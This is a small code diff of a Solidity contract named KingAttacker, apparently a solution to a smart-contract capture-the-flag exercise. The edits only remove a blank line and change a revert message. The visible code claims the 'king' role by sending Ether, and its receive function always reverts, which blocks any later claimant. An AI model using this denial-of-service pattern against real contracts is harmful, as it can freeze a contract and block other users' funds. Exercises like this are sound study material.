@@ -11,7 +11,6 @@ contract KingAttacker {
     }
 
     // send money and reclamain the king position
-
     function claim() public payable {
         (bool sent, ) = payable(king).call{value: msg.value}("");
         require(sent, "Failed to send Ether");
@@ -19,6 +18,6 @@ contract KingAttacker {
 
     // receive fallback that only reverts
     receive() external payable {
-        revert("trolei!");
+        revert("troslei!");
     }
 }
